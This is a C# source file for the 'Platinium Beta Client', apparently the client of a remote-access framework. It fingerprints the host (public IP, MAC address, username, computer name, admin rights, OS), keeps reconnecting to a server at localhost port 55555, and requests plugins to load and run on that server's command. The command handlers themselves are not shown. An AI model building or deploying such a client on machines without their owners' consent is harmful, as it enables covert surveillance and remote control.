using Platinium.Shared.Content;
using Platinium.Shared.Core;
using Platinium.Shared.Data.Packages;
using Platinium.Shared.Data.Serialization;
using Platinium.Shared.Info;
using System;
using System.Management;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;

namespace Platinium
{
    namespace Entities
    {
        class PlatiniumClient
        {
            private ClientInfo ClientInfo = BuildClientInfo();
            private TcpClient clientSocket = new TcpClient();
            private NetworkStream serverStream = default(NetworkStream);
            private static bool isConnected = false;
            public PlatiniumClient()
            {
                Console.Title = "Platinium Beta Client";
                Initialize();
            }
            private void Initialize()
            {
                while (true)
                {
                    if (!isConnected)
                    {
                        try
                        {
                            clientSocket = new TcpClient();
                            clientSocket.Connect(new IPEndPoint(IPAddress.Parse("127.0.0.1"), 55555));
                            serverStream = clientSocket.GetStream();
                            Write(new Package(null, ClientInfo, PackageType.Base, ClientInfo, new ClientInfo(BaseInfoType.Server)));
                            Thread GetThread = new Thread(Get);
                            GetThread.Start();
                            LoadPlugins();
                            isConnected = true;
                        }
                        catch (Exception) { }
                    }
                }
            }
            private void LoadPlugins()
            {
                Console.WriteLine("DOWNLOADING PLUGINS");
                Write(new Package("LOAD_PLUGINS", null, PackageType.Data, ClientInfo, new ClientInfo(BaseInfoType.Server)));
            }
            private void Write(Package package)
            {
                try
                {
                    TransportPackage TransportPackage = Serializer.Serialize(package);
                    serverStream.Write(TransportPackage.Data, 0, TransportPackage.Data.Length);
                    serverStream.Flush();
                    Console.WriteLine("WRITE");
                }
                catch (Exception) { isConnected = false; }
            }
            private void Get()
            {
                while (true)
                {
                    serverStream = clientSocket.GetStream();
                    TransportPackage TransportPackage = new TransportPackage();
                    try
                    {
                        serverStream.Read(TransportPackage.Data, 0, TransportPackage.Data.Length);
                    }
                    catch (Exception) { isConnected = false; break; }
                    serverStream.Flush();
                    Package package = (Package)Serializer.Deserialize(TransportPackage);
                    Console.WriteLine(package.Content.EmptyIfNull());
                    Console.WriteLine(package.PackageType.ToString());
                    package = PackageFactory.HandleClientPackages(package);
                    Write(package);
                    Console.WriteLine("GET");
                }
                Thread.CurrentThread.Abort();
            }
            private static ClientInfo BuildClientInfo()
            {
                ClientInfo ci = new ClientInfo
                {
                    IP = CFunctions.GetPublicIP(),
                    MACAddress = CFunctions.GetMacAddress(),
                    UserName = CFunctions.GetCurrentLoggedUser(),
                    ComputerName = CFunctions.GetComputerName(),
                    UID = FingerPrint.Value(),
                    Type = BaseInfoType.Client,
                    IsAdministrator = CFunctions.IsAdministrator(),
                    Language = CFunctions.GetCurrentCulture(),
                    AppNetVersion = CFunctions.GetAppNetVersion(),
                    OSName = CFunctions.GetOSName()
                };
                return ci;
            }
        }
    }
}
